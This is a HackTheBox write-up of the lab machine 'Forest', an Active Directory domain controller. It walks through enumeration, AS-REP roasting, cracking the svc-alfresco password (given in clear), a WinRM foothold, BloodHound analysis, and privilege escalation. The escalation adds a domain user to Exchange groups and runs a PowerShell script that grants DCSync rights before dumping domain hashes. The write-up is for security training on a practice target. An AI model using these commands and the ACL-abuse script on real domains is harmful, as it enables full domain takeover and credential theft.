#  Forest - HackTheBox WriteUp

![info_card](/images/forest/info_card.png)

## Enumeration & Information Gathering 

#### Scanning

```
Full TCP Nmap Scan:
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain?      syn-ack ttl 127
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-03-11 19:16:21Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49908/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
```

#### Smb Enumeration

enum4linux 10.10.10.161. The following users were identified:

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```


## Exploitation

Kerberoasting with Impacket - GetNPUsers.py
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

Doing a bit of cleanup to obtain only the usernames and trying all the users with Impacket GetNPUsers.py


![getnpusers1](/images/forest/getnpusers1.png)

![getnpusers2](/images/forest/getnpusers2.png)


We obtain the hash for user svc-alfresco.

Password crack with Hashcat:


![crack_svc_alfresco](/images/forest/crack_svc_alfresco.png)

#### Foothold

Trying to authenticate using evilwin-rm with credentials svc-alfresco:s3rvice

![auth_alfresco](/images/forest/auth_alfresco.png)

#### Post Exploitation Enumeration

Running Sherlock brought NO luck
 and nothing juicy from WinPeas output.

Couldn't run systeminfo in order to try windows-exploit-sugester

After realising that we are dealing with AD here, bloodhound seems a logical way to go check for privilege escalation.

We download and run Sharphound.ps1 to our victim.

Running bloodhound on our host system

```
apt install bloodhound

neo4j console 

bloodhoud
```

and uploading the output from the victim:

![hound_out](/images/forest/hound_out.png)

This shows that we have a path to Administrator from our svc-alfresco user.

The WriteDacl permissions on svc-alfresco seen from the below screenshot will make it possible to grant DCSync rights to a user and then be then we can further dump the Administrator password.


![hound_out](/images/forest/hound_out2.png)

Searching on google we find many articles related to **Exchange Windows Permissions Privilege escalation.**

## Privilege Escalation

After failing with Privexchange and AclPWN ( note: at this point I was trying to escalate directly with my first user "svc-alfresco")

This this git page appeared to have exactly what was needed.
[github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md) 

Add new user: 

`net user chris password1 /ADD /DOMAIN
`

Add user to Remote Management group ( to allow remote 
connections using WinRM/EvilWinRM): 

`net localgroup "Remote Management Users" /add chris
`

Add user to group "Exchange Windows Permissions": 

`net group "Exchange Windows Permissions" 
`

Add user to group "Organization Management(suggested in the article)": 

`net group "Organization Management" /add chris
`

Then follow the script as user chris:

But first import powerview.ps1 in order to leverage cmdlets get-acl and set-acl from AD


```
$acl = get-acl "ad:DC=htb,DC=local"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
# rightsGuid for the extended right Ds-Replication-Get-Changes-All
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
# rightsGuid for the extended right Ds-Replication-Get-Changes
$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=htb,DC=local"
```

Then Secrets Dump:

![sec_dump](/images/forest/sec_dump.png)


Authentication with the hash and root flag:


![root_auth_n_flag.png](/images/forest/root_auth_n_flag.png)


**Extra:** 

The machine had PowerView.ps1, a users.txt and revert.ps1 used for reversing the state of the machine for the svc-alfreco account permissions

Top 5 References:

1.	https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md
2.	https://github.com/dirkjanm/privexchange/
3.	https://github.com/fox-it/Invoke-ACLPwn
4.	https://spookysec.net/2019-12-01-domain-controller-sync/
5.	https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync

Failed attempts:

* https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
* https://www.andreafortuna.org/2019/01/30/abusing-microsoft-exchange-for-privilege-escalation-any-user-may-obtain-domain-admin-privileges/
* https://www.theregister.co.uk/2019/01/25/microsoft_exchange_domain_admin_eop/

Likely due to the fact that I was testing with the active user svc-alfresco

Thanks for reading!

<img src="https://www.hackthebox.eu/badge/image/206328" alt="Hack The Box">

